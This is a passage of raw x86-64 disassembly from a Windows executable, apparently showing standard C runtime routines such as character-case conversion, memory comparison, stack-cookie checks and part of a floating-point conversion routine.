   14000cf2e:	0f b6 4d 21          	movzbl 0x21(%rbp),%ecx
   14000cf32:	c1 e0 08             	shl    $0x8,%eax
   14000cf35:	0b c1                	or     %ecx,%eax
   14000cf37:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000cf3b:	74 0b                	je     0x14000cf48
   14000cf3d:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   14000cf41:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000cf48:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000cf4d:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   14000cf51:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000cf55:	49 8b e3             	mov    %r11,%rsp
   14000cf58:	5d                   	pop    %rbp
   14000cf59:	c3                   	ret
   14000cf5a:	cc                   	int3
   14000cf5b:	cc                   	int3
   14000cf5c:	83 3d cd ec 00 00 00 	cmpl   $0x0,0xeccd(%rip)        # 0x14001bc30
   14000cf63:	75 0e                	jne    0x14000cf73
   14000cf65:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000cf68:	83 f8 19             	cmp    $0x19,%eax
   14000cf6b:	77 03                	ja     0x14000cf70
   14000cf6d:	83 c1 20             	add    $0x20,%ecx
   14000cf70:	8b c1                	mov    %ecx,%eax
   14000cf72:	c3                   	ret
   14000cf73:	33 d2                	xor    %edx,%edx
   14000cf75:	e9 8e fe ff ff       	jmp    0x14000ce08
   14000cf7a:	cc                   	int3
   14000cf7b:	cc                   	int3
   14000cf7c:	40 57                	rex push %rdi
   14000cf7e:	48 83 ec 20          	sub    $0x20,%rsp
   14000cf82:	48 8d 3d 87 d0 00 00 	lea    0xd087(%rip),%rdi        # 0x14001a010
   14000cf89:	48 39 3d 70 d0 00 00 	cmp    %rdi,0xd070(%rip)        # 0x14001a000
   14000cf90:	74 2b                	je     0x14000cfbd
   14000cf92:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000cf97:	e8 14 af ff ff       	call   0x140007eb0
   14000cf9c:	90                   	nop
   14000cf9d:	48 8b d7             	mov    %rdi,%rdx
   14000cfa0:	48 8d 0d 59 d0 00 00 	lea    0xd059(%rip),%rcx        # 0x14001a000
   14000cfa7:	e8 fc c0 ff ff       	call   0x1400090a8
   14000cfac:	48 89 05 4d d0 00 00 	mov    %rax,0xd04d(%rip)        # 0x14001a000
   14000cfb3:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000cfb8:	e8 e3 b0 ff ff       	call   0x1400080a0
   14000cfbd:	48 83 c4 20          	add    $0x20,%rsp
   14000cfc1:	5f                   	pop    %rdi
   14000cfc2:	c3                   	ret
   14000cfc3:	cc                   	int3
   14000cfc4:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000cfc9:	55                   	push   %rbp
   14000cfca:	57                   	push   %rdi
   14000cfcb:	41 56                	push   %r14
   14000cfcd:	48 8b ec             	mov    %rsp,%rbp
   14000cfd0:	48 83 ec 60          	sub    $0x60,%rsp
   14000cfd4:	48 63 f9             	movslq %ecx,%rdi
   14000cfd7:	44 8b f2             	mov    %edx,%r14d
   14000cfda:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000cfde:	49 8b d0             	mov    %r8,%rdx
   14000cfe1:	e8 56 7f ff ff       	call   0x140004f3c
   14000cfe6:	8d 47 01             	lea    0x1(%rdi),%eax
   14000cfe9:	3d 00 01 00 00       	cmp    $0x100,%eax
   14000cfee:	77 11                	ja     0x14000d001
   14000cff0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000cff4:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   14000cffb:	0f b7 04 79          	movzwl (%rcx,%rdi,2),%eax
   14000cfff:	eb 79                	jmp    0x14000d07a
   14000d001:	8b f7                	mov    %edi,%esi
   14000d003:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000d007:	c1 fe 08             	sar    $0x8,%esi
   14000d00a:	40 0f b6 ce          	movzbl %sil,%ecx
   14000d00e:	e8 c5 c9 ff ff       	call   0x1400099d8
   14000d013:	ba 01 00 00 00       	mov    $0x1,%edx
   14000d018:	85 c0                	test   %eax,%eax
   14000d01a:	74 12                	je     0x14000d02e
   14000d01c:	40 88 75 38          	mov    %sil,0x38(%rbp)
   14000d020:	40 88 7d 39          	mov    %dil,0x39(%rbp)
   14000d024:	c6 45 3a 00          	movb   $0x0,0x3a(%rbp)
   14000d028:	44 8d 4a 01          	lea    0x1(%rdx),%r9d
   14000d02c:	eb 0b                	jmp    0x14000d039
   14000d02e:	40 88 7d 38          	mov    %dil,0x38(%rbp)
   14000d032:	c6 45 39 00          	movb   $0x0,0x39(%rbp)
   14000d036:	44 8b ca             	mov    %edx,%r9d
   14000d039:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000d03d:	89 54 24 30          	mov    %edx,0x30(%rsp)
   14000d041:	4c 8d 45 38          	lea    0x38(%rbp),%r8
   14000d045:	8b 48 04             	mov    0x4(%rax),%ecx
   14000d048:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000d04c:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000d050:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000d054:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d059:	e8 76 ef ff ff       	call   0x14000bfd4
   14000d05e:	85 c0                	test   %eax,%eax
   14000d060:	75 14                	jne    0x14000d076
   14000d062:	38 45 f8             	cmp    %al,-0x8(%rbp)
   14000d065:	74 0b                	je     0x14000d072
   14000d067:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000d06b:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000d072:	33 c0                	xor    %eax,%eax
   14000d074:	eb 18                	jmp    0x14000d08e
   14000d076:	0f b7 45 20          	movzwl 0x20(%rbp),%eax
   14000d07a:	41 23 c6             	and    %r14d,%eax
   14000d07d:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000d081:	74 0b                	je     0x14000d08e
   14000d083:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   14000d087:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000d08e:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   14000d095:	00 
   14000d096:	48 83 c4 60          	add    $0x60,%rsp
   14000d09a:	41 5e                	pop    %r14
   14000d09c:	5f                   	pop    %rdi
   14000d09d:	5d                   	pop    %rbp
   14000d09e:	c3                   	ret
   14000d09f:	cc                   	int3
   14000d0a0:	cc                   	int3
   14000d0a1:	cc                   	int3
   14000d0a2:	cc                   	int3
   14000d0a3:	cc                   	int3
   14000d0a4:	cc                   	int3
   14000d0a5:	cc                   	int3
   14000d0a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d0ad:	00 00 00 
   14000d0b0:	48 2b d1             	sub    %rcx,%rdx
   14000d0b3:	49 83 f8 08          	cmp    $0x8,%r8
   14000d0b7:	72 22                	jb     0x14000d0db
   14000d0b9:	f6 c1 07             	test   $0x7,%cl
   14000d0bc:	74 14                	je     0x14000d0d2
   14000d0be:	66 90                	xchg   %ax,%ax
   14000d0c0:	8a 01                	mov    (%rcx),%al
   14000d0c2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   14000d0c5:	75 2c                	jne    0x14000d0f3
   14000d0c7:	48 ff c1             	inc    %rcx
   14000d0ca:	49 ff c8             	dec    %r8
   14000d0cd:	f6 c1 07             	test   $0x7,%cl
   14000d0d0:	75 ee                	jne    0x14000d0c0
   14000d0d2:	4d 8b c8             	mov    %r8,%r9
   14000d0d5:	49 c1 e9 03          	shr    $0x3,%r9
   14000d0d9:	75 1f                	jne    0x14000d0fa
   14000d0db:	4d 85 c0             	test   %r8,%r8
   14000d0de:	74 0f                	je     0x14000d0ef
   14000d0e0:	8a 01                	mov    (%rcx),%al
   14000d0e2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   14000d0e5:	75 0c                	jne    0x14000d0f3
   14000d0e7:	48 ff c1             	inc    %rcx
   14000d0ea:	49 ff c8             	dec    %r8
   14000d0ed:	75 f1                	jne    0x14000d0e0
   14000d0ef:	48 33 c0             	xor    %rax,%rax
   14000d0f2:	c3                   	ret
   14000d0f3:	1b c0                	sbb    %eax,%eax
   14000d0f5:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000d0f8:	c3                   	ret
   14000d0f9:	90                   	nop
   14000d0fa:	49 c1 e9 02          	shr    $0x2,%r9
   14000d0fe:	74 37                	je     0x14000d137
   14000d100:	48 8b 01             	mov    (%rcx),%rax
   14000d103:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   14000d107:	75 5b                	jne    0x14000d164
   14000d109:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000d10d:	48 3b 44 0a 08       	cmp    0x8(%rdx,%rcx,1),%rax
   14000d112:	75 4c                	jne    0x14000d160
   14000d114:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000d118:	48 3b 44 0a 10       	cmp    0x10(%rdx,%rcx,1),%rax
   14000d11d:	75 3d                	jne    0x14000d15c
   14000d11f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000d123:	48 3b 44 0a 18       	cmp    0x18(%rdx,%rcx,1),%rax
   14000d128:	75 2e                	jne    0x14000d158
   14000d12a:	48 83 c1 20          	add    $0x20,%rcx
   14000d12e:	49 ff c9             	dec    %r9
   14000d131:	75 cd                	jne    0x14000d100
   14000d133:	49 83 e0 1f          	and    $0x1f,%r8
   14000d137:	4d 8b c8             	mov    %r8,%r9
   14000d13a:	49 c1 e9 03          	shr    $0x3,%r9
   14000d13e:	74 9b                	je     0x14000d0db
   14000d140:	48 8b 01             	mov    (%rcx),%rax
   14000d143:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   14000d147:	75 1b                	jne    0x14000d164
   14000d149:	48 83 c1 08          	add    $0x8,%rcx
   14000d14d:	49 ff c9             	dec    %r9
   14000d150:	75 ee                	jne    0x14000d140
   14000d152:	49 83 e0 07          	and    $0x7,%r8
   14000d156:	eb 83                	jmp    0x14000d0db
   14000d158:	48 83 c1 08          	add    $0x8,%rcx
   14000d15c:	48 83 c1 08          	add    $0x8,%rcx
   14000d160:	48 83 c1 08          	add    $0x8,%rcx
   14000d164:	48 8b 0c 11          	mov    (%rcx,%rdx,1),%rcx
   14000d168:	48 0f c8             	bswap  %rax
   14000d16b:	48 0f c9             	bswap  %rcx
   14000d16e:	48 3b c1             	cmp    %rcx,%rax
   14000d171:	1b c0                	sbb    %eax,%eax
   14000d173:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000d176:	c3                   	ret
   14000d177:	cc                   	int3
   14000d178:	40 53                	rex push %rbx
   14000d17a:	56                   	push   %rsi
   14000d17b:	57                   	push   %rdi
   14000d17c:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000d183:	48 8b 05 76 be 00 00 	mov    0xbe76(%rip),%rax        # 0x140019000
   14000d18a:	48 33 c4             	xor    %rsp,%rax
   14000d18d:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000d192:	48 8b f1             	mov    %rcx,%rsi
   14000d195:	48 8b da             	mov    %rdx,%rbx
   14000d198:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000d19d:	49 8b d0             	mov    %r8,%rdx
   14000d1a0:	49 8b f9             	mov    %r9,%rdi
   14000d1a3:	e8 94 7d ff ff       	call   0x140004f3c
   14000d1a8:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000d1ad:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000d1b2:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000d1b7:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000d1bc:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000d1c1:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000d1c6:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000d1cb:	45 33 c9             	xor    %r9d,%r9d
   14000d1ce:	4c 8b c3             	mov    %rbx,%r8
   14000d1d1:	e8 4a 0d 00 00       	call   0x14000df20
   14000d1d6:	8b d8                	mov    %eax,%ebx
   14000d1d8:	48 85 ff             	test   %rdi,%rdi
   14000d1db:	74 08                	je     0x14000d1e5
   14000d1dd:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000d1e2:	48 89 0f             	mov    %rcx,(%rdi)
   14000d1e5:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000d1ea:	48 8b d6             	mov    %rsi,%rdx
   14000d1ed:	e8 76 07 00 00       	call   0x14000d968
   14000d1f2:	8b c8                	mov    %eax,%ecx
   14000d1f4:	b8 03 00 00 00       	mov    $0x3,%eax
   14000d1f9:	84 d8                	test   %bl,%al
   14000d1fb:	75 0c                	jne    0x14000d209
   14000d1fd:	83 f9 01             	cmp    $0x1,%ecx
   14000d200:	74 1a                	je     0x14000d21c
   14000d202:	83 f9 02             	cmp    $0x2,%ecx
   14000d205:	75 13                	jne    0x14000d21a
   14000d207:	eb 05                	jmp    0x14000d20e
   14000d209:	f6 c3 01             	test   $0x1,%bl
   14000d20c:	74 07                	je     0x14000d215
   14000d20e:	b8 04 00 00 00       	mov    $0x4,%eax
   14000d213:	eb 07                	jmp    0x14000d21c
   14000d215:	f6 c3 02             	test   $0x2,%bl
   14000d218:	75 02                	jne    0x14000d21c
   14000d21a:	33 c0                	xor    %eax,%eax
   14000d21c:	80 7c 24 60 00       	cmpb   $0x0,0x60(%rsp)
   14000d221:	74 0c                	je     0x14000d22f
   14000d223:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000d228:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000d22f:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000d234:	48 33 cc             	xor    %rsp,%rcx
   14000d237:	e8 04 60 ff ff       	call   0x140003240
   14000d23c:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000d243:	5f                   	pop    %rdi
   14000d244:	5e                   	pop    %rsi
   14000d245:	5b                   	pop    %rbx
   14000d246:	c3                   	ret
   14000d247:	cc                   	int3
   14000d248:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000d24d:	57                   	push   %rdi
   14000d24e:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000d255:	48 8b 05 a4 bd 00 00 	mov    0xbda4(%rip),%rax        # 0x140019000
   14000d25c:	48 33 c4             	xor    %rsp,%rax
   14000d25f:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000d264:	48 8b f9             	mov    %rcx,%rdi
   14000d267:	48 8b da             	mov    %rdx,%rbx
   14000d26a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000d26f:	49 8b d0             	mov    %r8,%rdx
   14000d272:	e8 c5 7c ff ff       	call   0x140004f3c
   14000d277:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000d27c:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000d281:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000d286:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000d28b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000d290:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000d295:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000d29a:	45 33 c9             	xor    %r9d,%r9d
   14000d29d:	4c 8b c3             	mov    %rbx,%r8
   14000d2a0:	e8 7b 0c 00 00       	call   0x14000df20
   14000d2a5:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000d2aa:	48 8b d7             	mov    %rdi,%rdx
   14000d2ad:	8b d8                	mov    %eax,%ebx
   14000d2af:	e8 fc 00 00 00       	call   0x14000d3b0
   14000d2b4:	8b c8                	mov    %eax,%ecx
   14000d2b6:	b8 03 00 00 00       	mov    $0x3,%eax
   14000d2bb:	84 d8                	test   %bl,%al
   14000d2bd:	75 0c                	jne    0x14000d2cb
   14000d2bf:	83 f9 01             	cmp    $0x1,%ecx
   14000d2c2:	74 1a                	je     0x14000d2de
   14000d2c4:	83 f9 02             	cmp    $0x2,%ecx
   14000d2c7:	75 13                	jne    0x14000d2dc
   14000d2c9:	eb 05                	jmp    0x14000d2d0
   14000d2cb:	f6 c3 01             	test   $0x1,%bl
   14000d2ce:	74 07                	je     0x14000d2d7
   14000d2d0:	b8 04 00 00 00       	mov    $0x4,%eax
   14000d2d5:	eb 07                	jmp    0x14000d2de
   14000d2d7:	f6 c3 02             	test   $0x2,%bl
   14000d2da:	75 02                	jne    0x14000d2de
   14000d2dc:	33 c0                	xor    %eax,%eax
   14000d2de:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000d2e3:	74 0c                	je     0x14000d2f1
   14000d2e5:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000d2ea:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000d2f1:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000d2f6:	48 33 cc             	xor    %rsp,%rcx
   14000d2f9:	e8 42 5f ff ff       	call   0x140003240
   14000d2fe:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   14000d305:	00 
   14000d306:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000d30d:	5f                   	pop    %rdi
   14000d30e:	c3                   	ret
   14000d30f:	cc                   	int3
   14000d310:	45 33 c9             	xor    %r9d,%r9d
   14000d313:	e9 60 fe ff ff       	jmp    0x14000d178
   14000d318:	e9 03 00 00 00       	jmp    0x14000d320
   14000d31d:	cc                   	int3
   14000d31e:	cc                   	int3
   14000d31f:	cc                   	int3
   14000d320:	48 8d 05 11 1f 00 00 	lea    0x1f11(%rip),%rax        # 0x14000f238
   14000d327:	48 8d 0d 56 14 00 00 	lea    0x1456(%rip),%rcx        # 0x14000e784
   14000d32e:	48 89 05 43 ce 00 00 	mov    %rax,0xce43(%rip)        # 0x14001a178
   14000d335:	48 8d 05 9c 1f 00 00 	lea    0x1f9c(%rip),%rax        # 0x14000f2d8
   14000d33c:	48 89 0d 2d ce 00 00 	mov    %rcx,0xce2d(%rip)        # 0x14001a170
   14000d343:	48 89 05 36 ce 00 00 	mov    %rax,0xce36(%rip)        # 0x14001a180
   14000d34a:	48 8d 05 cf 1f 00 00 	lea    0x1fcf(%rip),%rax        # 0x14000f320
   14000d351:	48 89 0d 40 ce 00 00 	mov    %rcx,0xce40(%rip)        # 0x14001a198
   14000d358:	48 89 05 29 ce 00 00 	mov    %rax,0xce29(%rip)        # 0x14001a188
   14000d35f:	48 8d 05 42 20 00 00 	lea    0x2042(%rip),%rax        # 0x14000f3a8
   14000d366:	48 89 05 23 ce 00 00 	mov    %rax,0xce23(%rip)        # 0x14001a190
   14000d36d:	48 8d 05 34 14 00 00 	lea    0x1434(%rip),%rax        # 0x14000e7a8
   14000d374:	48 89 05 25 ce 00 00 	mov    %rax,0xce25(%rip)        # 0x14001a1a0
   14000d37b:	48 8d 05 5e 1f 00 00 	lea    0x1f5e(%rip),%rax        # 0x14000f2e0
   14000d382:	48 89 05 1f ce 00 00 	mov    %rax,0xce1f(%rip)        # 0x14001a1a8
   14000d389:	48 8d 05 b0 1e 00 00 	lea    0x1eb0(%rip),%rax        # 0x14000f240
   14000d390:	48 89 05 19 ce 00 00 	mov    %rax,0xce19(%rip)        # 0x14001a1b0
   14000d397:	48 8d 05 8a 1f 00 00 	lea    0x1f8a(%rip),%rax        # 0x14000f328
   14000d39e:	48 89 05 13 ce 00 00 	mov    %rax,0xce13(%rip)        # 0x14001a1b8
   14000d3a5:	c3                   	ret
   14000d3a6:	cc                   	int3
   14000d3a7:	cc                   	int3
   14000d3a8:	cc                   	int3
   14000d3a9:	cc                   	int3
   14000d3aa:	cc                   	int3
   14000d3ab:	cc                   	int3
   14000d3ac:	cc                   	int3
   14000d3ad:	cc                   	int3
   14000d3ae:	cc                   	int3
   14000d3af:	cc                   	int3
   14000d3b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d3b5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000d3ba:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d3bf:	55                   	push   %rbp
   14000d3c0:	41 54                	push   %r12
   14000d3c2:	41 55                	push   %r13
   14000d3c4:	41 56                	push   %r14
   14000d3c6:	41 57                	push   %r15
   14000d3c8:	48 8b ec             	mov    %rsp,%rbp
   14000d3cb:	48 83 ec 60          	sub    $0x60,%rsp
   14000d3cf:	48 8b 05 2a bc 00 00 	mov    0xbc2a(%rip),%rax        # 0x140019000
   14000d3d6:	48 33 c4             	xor    %rsp,%rax
   14000d3d9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000d3dd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   14000d3e1:	44 0f b7 09          	movzwl (%rcx),%r9d
   14000d3e5:	33 db                	xor    %ebx,%ebx
   14000d3e7:	8b f8                	mov    %eax,%edi
   14000d3e9:	25 00 80 00 00       	and    $0x8000,%eax
   14000d3ee:	41 c1 e1 10          	shl    $0x10,%r9d
   14000d3f2:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   14000d3f5:	8b 41 06             	mov    0x6(%rcx),%eax
   14000d3f8:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
   14000d3fe:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000d401:	8b 41 02             	mov    0x2(%rcx),%eax
   14000d404:	81 ef ff 3f 00 00    	sub    $0x3fff,%edi
   14000d40a:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   14000d410:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
   14000d414:	44 89 4d d8          	mov    %r9d,-0x28(%rbp)
   14000d418:	89 45 ec             	mov    %eax,-0x14(%rbp)
   14000d41b:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   14000d41f:	8d 73 01             	lea    0x1(%rbx),%esi
   14000d422:	45 8d 74 24 e4       	lea    -0x1c(%r12),%r14d
   14000d427:	81 ff 01 c0 ff ff    	cmp    $0xffffc001,%edi
   14000d42d:	75 29                	jne    0x14000d458
   14000d42f:	44 8b c3             	mov    %ebx,%r8d
   14000d432:	8b c3                	mov    %ebx,%eax
   14000d434:	39 5c 85 e8          	cmp    %ebx,-0x18(%rbp,%rax,4)
   14000d438:	75 0d                	jne    0x14000d447
   14000d43a:	48 03 c6             	add    %rsi,%rax
   14000d43d:	49 3b c6             	cmp    %r14,%rax
   14000d440:	7c f2                	jl     0x14000d434
   14000d442:	e9 b7 04 00 00       	jmp    0x14000d8fe
   14000d447:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000d44b:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000d44e:	bb 02 00 00 00       	mov    $0x2,%ebx
   14000d453:	e9 a6 04 00 00       	jmp    0x14000d8fe
   14000d458:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000d45c:	45 8b c4             	mov    %r12d,%r8d
   14000d45f:	41 83 cf ff          	or     $0xffffffff,%r15d
   14000d463:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000d467:	8b 05 53 cf 00 00    	mov    0xcf53(%rip),%eax        # 0x14001a3c0
   14000d46d:	89 7d c0             	mov    %edi,-0x40(%rbp)
   14000d470:	ff c8                	dec    %eax
   14000d472:	44 8b eb             	mov    %ebx,%r13d
   14000d475:	89 45 c8             	mov    %eax,-0x38(%rbp)
   14000d478:	ff c0                	inc    %eax
   14000d47a:	99                   	cltd
   14000d47b:	41 23 d4             	and    %r12d,%edx
   14000d47e:	03 c2                	add    %edx,%eax
   14000d480:	44 8b d0             	mov    %eax,%r10d
   14000d483:	41 23 c4             	and    %r12d,%eax
   14000d486:	41 c1 fa 05          	sar    $0x5,%r10d
   14000d48a:	2b c2                	sub    %edx,%eax
   14000d48c:	44 2b c0             	sub    %eax,%r8d
   14000d48f:	4d 63 da             	movslq %r10d,%r11
   14000d492:	42 8b 4c 9d e8       	mov    -0x18(%rbp,%r11,4),%ecx
   14000d497:	44 89 45 dc          	mov    %r8d,-0x24(%rbp)
   14000d49b:	44 0f a3 c1          	bt     %r8d,%ecx
   14000d49f:	0f 83 9e 00 00 00    	jae    0x14000d543
   14000d4a5:	41 8b c8             	mov    %r8d,%ecx
   14000d4a8:	41 8b c7             	mov    %r15d,%eax
   14000d4ab:	49 63 d2             	movslq %r10d,%rdx
   14000d4ae:	d3 e0                	shl    %cl,%eax
   14000d4b0:	f7 d0                	not    %eax
   14000d4b2:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   14000d4b6:	75 19                	jne    0x14000d4d1
   14000d4b8:	41 8d 42 01          	lea    0x1(%r10),%eax
   14000d4bc:	48 63 c8             	movslq %eax,%rcx
   14000d4bf:	eb 09                	jmp    0x14000d4ca
   14000d4c1:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   14000d4c5:	75 0a                	jne    0x14000d4d1
   14000d4c7:	48 03 ce             	add    %rsi,%rcx
   14000d4ca:	49 3b ce             	cmp    %r14,%rcx
   14000d4cd:	7c f2                	jl     0x14000d4c1
   14000d4cf:	eb 72                	jmp    0x14000d543
   14000d4d1:	8b 45 c8             	mov    -0x38(%rbp),%eax
   14000d4d4:	41 8b cc             	mov    %r12d,%ecx
   14000d4d7:	99                   	cltd
   14000d4d8:	41 23 d4             	and    %r12d,%edx
   14000d4db:	03 c2                	add    %edx,%eax
   14000d4dd:	44 8b c0             	mov    %eax,%r8d
   14000d4e0:	41 23 c4             	and    %r12d,%eax
   14000d4e3:	2b c2                	sub    %edx,%eax
   14000d4e5:	41 c1 f8 05          	sar    $0x5,%r8d
   14000d4e9:	8b d6                	mov    %esi,%edx
   14000d4eb:	2b c8                	sub    %eax,%ecx
   14000d4ed:	4d 63 d8             	movslq %r8d,%r11
   14000d4f0:	42 8b 44 9d e8       	mov    -0x18(%rbp,%r11,4),%eax
   14000d4f5:	d3 e2                	shl    %cl,%edx
   14000d4f7:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   14000d4fa:	3b c8                	cmp    %eax,%ecx
   14000d4fc:	72 04                	jb     0x14000d502
   14000d4fe:	3b ca                	cmp    %edx,%ecx
   14000d500:	73 03                	jae    0x14000d505
   14000d502:	44 8b ee             	mov    %esi,%r13d
   14000d505:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   14000d509:	42 89 4c 9d e8       	mov    %ecx,-0x18(%rbp,%r11,4)
   14000d50e:	48 63 d0             	movslq %eax,%rdx
   14000d511:	85 c0                	test   %eax,%eax
   14000d513:	78 27                	js     0x14000d53c
   14000d515:	45 85 ed             	test   %r13d,%r13d
   14000d518:	74 22                	je     0x14000d53c
   14000d51a:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   14000d51e:	44 8b eb             	mov    %ebx,%r13d
   14000d521:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000d525:	44 3b c0             	cmp    %eax,%r8d
   14000d528:	72 05                	jb     0x14000d52f
   14000d52a:	44 3b c6             	cmp    %esi,%r8d
   14000d52d:	73 03                	jae    0x14000d532
   14000d52f:	44 8b ee             	mov    %esi,%r13d
   14000d532:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   14000d537:	48 2b d6             	sub    %rsi,%rdx
   14000d53a:	79 d9                	jns    0x14000d515
   14000d53c:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
   14000d540:	4d 63 da             	movslq %r10d,%r11
   14000d543:	41 8b c8             	mov    %r8d,%ecx
   14000d546:	41 8b c7             	mov    %r15d,%eax
   14000d549:	d3 e0                	shl    %cl,%eax
   14000d54b:	42 21 44 9d e8       	and    %eax,-0x18(%rbp,%r11,4)
   14000d550:	41 8d 42 01          	lea    0x1(%r10),%eax
   14000d554:	48 63 d0             	movslq %eax,%rdx
   14000d557:	49 3b d6             	cmp    %r14,%rdx
   14000d55a:	7d 1d                	jge    0x14000d579
   14000d55c:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000d560:	4d 8b c6             	mov    %r14,%r8
   14000d563:	4c 2b c2             	sub    %rdx,%r8
   14000d566:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   14000d56a:	33 d2                	xor    %edx,%edx
   14000d56c:	49 c1 e0 02          	shl    $0x2,%r8
   14000d570:	e8 2b 52 ff ff       	call   0x1400027a0
   14000d575:	44 8b 4d d8          	mov    -0x28(%rbp),%r9d
   14000d579:	45 85 ed             	test   %r13d,%r13d
   14000d57c:	74 02                	je     0x14000d580
   14000d57e:	03 fe                	add    %esi,%edi
   14000d580:	8b 0d 36 ce 00 00    	mov    0xce36(%rip),%ecx        # 0x14001a3bc
   14000d586:	8b c1                	mov    %ecx,%eax
   14000d588:	2b 05 32 ce 00 00    	sub    0xce32(%rip),%eax        # 0x14001a3c0
   14000d58e:	3b f8                	cmp    %eax,%edi
   14000d590:	7d 14                	jge    0x14000d5a6
   14000d592:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000d596:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000d599:	44 8b c3             	mov    %ebx,%r8d
   14000d59c:	bb 02 00 00 00       	mov    $0x2,%ebx
   14000d5a1:	e9 54 03 00 00       	jmp    0x14000d8fa
   14000d5a6:	3b f9                	cmp    %ecx,%edi
   14000d5a8:	0f 8f 31 02 00 00    	jg     0x14000d7df
